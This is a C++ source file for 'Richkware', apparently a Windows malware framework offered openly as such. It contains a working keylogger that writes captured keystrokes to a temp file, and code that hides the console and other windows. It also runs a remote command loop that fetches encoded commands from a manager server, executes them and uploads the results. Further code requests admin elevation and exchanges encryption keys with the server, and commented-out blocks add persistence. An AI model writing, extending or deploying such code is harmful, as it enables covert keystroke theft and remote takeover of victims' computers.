/*
*      Copyright 2016 Riccardo Melioli.
*/

#include "richkware.h"

BOOL Richkware::IsAdmin() {
    BOOL fIsRunAsAdmin = FALSE;
    DWORD dwError = ERROR_SUCCESS;
    PSID pAdministratorsGroup = NULL;

    SID_IDENTIFIER_AUTHORITY NtAuthority = SECURITY_NT_AUTHORITY;
    if (!AllocateAndInitializeSid(&NtAuthority, 2,
                                  SECURITY_BUILTIN_DOMAIN_RID,
                                  DOMAIN_ALIAS_RID_ADMINS, 0, 0, 0, 0, 0, 0, &pAdministratorsGroup)) {
        dwError = GetLastError();

    } else if (!CheckTokenMembership(NULL, pAdministratorsGroup,
                                     &fIsRunAsAdmin)) {
        dwError = GetLastError();

    }

    if (pAdministratorsGroup) {
        FreeSid(pAdministratorsGroup);
        pAdministratorsGroup = NULL;
    }

    if (ERROR_SUCCESS != dwError) {
        throw dwError;
    }

    return fIsRunAsAdmin;
}

void Richkware::RequestAdminPrivileges() {
    BOOL bAlreadyRunningAsAdministrator = FALSE;
    try {
        bAlreadyRunningAsAdministrator = IsAdmin();
    }
    catch (...) {

    }
    if (!bAlreadyRunningAsAdministrator) {
        char szPath[MAX_PATH];
        if (GetModuleFileName(NULL, szPath, MAX_PATH)) {

            SHELLEXECUTEINFO sei = {sizeof(sei)};

            sei.lpVerb = "runas";
            sei.lpFile = szPath;
            sei.hwnd = NULL;
            sei.nShow = SW_NORMAL;

            /*if (!ShellExecuteEx(&sei)) {
             DWORD dwError = GetLastError();
             //if (dwError == ERROR_CANCELLED)
             //CreateThread(0, 0, (LPTHREAD_START_ROUTINE) RequestAdminPrivileges, 0, 0, 0);
             }*/
        }

    } else {
        ///Code
    }
}


void Richkware::StealthWindow(const char *window) {
    HWND app_heandler = FindWindow(NULL, window);
    Sleep(1000);
    if (app_heandler != NULL)
        ShowWindow(app_heandler, false);
}

// OpenApp("notepad.exe");  "http:\\www.google.com"
void Richkware::OpenApp(const char *app) {
    ShellExecute(NULL, "open", app, NULL, NULL, SW_MAXIMIZE);
}


void Richkware::RandMouse() {
    // screen resolution
    RECT desktop;
    const HWND desktop_handler = GetDesktopWindow();
    GetWindowRect(desktop_handler, &desktop);
    long horizontal = desktop.right;
    long vertical = desktop.bottom;

    // move cursor
    SetCursorPos((rand() % horizontal + 1), (rand() % vertical + 1));
}

std::vector<std::string> Richkware::getCommands() {
    std::string commands = network.fetchCommand();
    std::string decodedCommands = Base64_decode(commands);
    std::vector<std::string> commandList;
    std::vector<std::string> result;
    //decrypt string
//    Crypto crypto(encryptionKey);
//    if (!commands.empty()) {
//        std::string decryptedCommands = crypto.Decrypt(commands);
    commandList = utils::split(decodedCommands, "##");
//        return commandList;
//    }
    //decode single commands
    for (size_t i = 0; i < commandList.size(); ++i) {
        std::string temp = Base64_decode(commandList.at(i));
        result.push_back(temp);
    }
    return result;
}

std::string Richkware::executeCommand(std::string command) {
    //encrypt the output of the command
    std::string output = CodeExecution(command);
    std::string encodedOutput = Base64_encode((const unsigned char *) output.c_str(), output.size());
    return CodeExecution(command).c_str();
}

void Richkware::Keylogger(const char *fileName) {
    HANDLE hBlockAppsTh = CreateThread(0, 0, &KeyloggerThread, (void *) fileName, 0, 0);

    if (hBlockAppsTh != NULL) {
        WaitForSingleObject(hBlockAppsTh, INFINITE);
        CloseHandle(hBlockAppsTh);
    }
}

void Richkware::Hibernation() {
    Sleep(1000);
    SendMessage(HWND_BROADCAST,
                WM_SYSCOMMAND,
                SC_MONITORPOWER, (LPARAM) 2);
}

void Richkware::uploadCommandsResponse(std::string output) {
    network.uploadCommand(output);
}


Richkware::Richkware(const char *AppNameArg, std::string EncryptionKeyArg) {
    appName = AppNameArg;
    ShowWindow(GetConsoleWindow(), 0);
    encryptionKey = EncryptionKeyArg;
    //network = Network(EncryptionKeyArg);
    session = Session(EncryptionKeyArg, AppNameArg);
    systemStorage = SystemStorage(AppNameArg);
    blockApps = BlockApps();

    /*
    if (!(CheckSession()) && !(CheckPersistance())) {	// first run
    SaveInfo("FirstRun", "false");
    Persistance();
    }
    else if (!(CheckSession())) {	// N session, Y pers
    SaveInfo("FirstRun", "false");
    SaveInfo("RegCleaner", "true");
    }
    else if (!(CheckPersistance())) {	// Y session, N pers
    SaveInfo("TmpSysCleaner", "true");
    Persistance();
    }*/

    // metti check per ogni cosa registro o file in modo da sapere se ha qualcosa che controlla il registro o qualcosa che effettui pulizie o un antivirus

}

Richkware::Richkware(const char *AppNameArg, RmsInfo rmsInfo) {
    appName = AppNameArg;
    // TODO RELEASE UNCOMMENT before release
    // Hide console
    //ShowWindow(GetConsoleWindow(), 0);
    systemStorage = SystemStorage(AppNameArg);

    // **encryptionKey**: check presence of encryption key in the system
    Crypto crypto(rmsInfo.defaultEncryptionKey);
    std::string encKey = systemStorage.LoadValueFromFile(appName + "_encKey.richk");

    if (encKey.empty()) {
        // Key Exchange with Richkware-Manager-Server, using defaultEncryptionKey.
        //OLD Network network1(defaultEncryptionKey);
        //OLD encKey = network1.GetEncryptionKeyFromRMS(serverAddress, port, associatedUser);
        encKey = Network::GetEncryptionKeyFromRMS(rmsInfo.serverAddress, rmsInfo.port, rmsInfo.associatedUser,
                                                  rmsInfo.defaultEncryptionKey);

        if (encKey.empty() || (encKey.compare("Error") == 0)) {
            // Key Exchange failed
            encryptionKey = rmsInfo.defaultEncryptionKey;
        } else {
            // Key Exchange succeed
            encryptionKey = encKey;
            // save the encryption key(obtained from the RMS), encrypted with default password
            encKey = crypto.Encrypt(encKey);
            systemStorage.SaveValueToFile(appName + "_encKey.richk", encKey);
        }
    } else {
        // Encryption Key already present
        encKey = crypto.Decrypt(encKey);
        encryptionKey = encKey;
    }

    network = Network(rmsInfo.serverAddress, rmsInfo.port, rmsInfo.associatedUser, encryptionKey,
                      rmsInfo.defaultEncryptionKey);
    session = Session(encryptionKey, AppNameArg);
    blockApps = BlockApps();
}

DWORD WINAPI KeyloggerThread(void *arg) {
    const char *nomeFile = (const char *) arg;
    char tmp_path[MAX_PATH];
    GetTempPath(MAX_PATH, tmp_path);
    std::string fileLog = tmp_path;
    fileLog.append(nomeFile);
    bool condSession = true;

    while (true) {
        std::ofstream file(fileLog.c_str(), std::ios::app);
        if (file.is_open()) {
            while (condSession) {
                for (int i = 0; i < 256; i++) {
                    if (GetAsyncKeyState(i)) {
                        file << (char) i;
                        if (i == VK_RETURN || i == VK_LBUTTON) {
                            condSession = false;
                            break;
                        }
                    }
                }
                Sleep(100);
            }
        }
        file.close();
        condSession = true;
    }
}

RmsInfo::RmsInfo(const char *defaultEncryptionKeyArg, const char *serverAddressArg, const char *portArg,
                 const char *serviceNameArg, const char *associatedUserArg) {
    defaultEncryptionKey = defaultEncryptionKeyArg;
    serverAddress = serverAddressArg;
    port = portArg;
    serviceName = serviceNameArg;
    associatedUser = associatedUserArg;
}
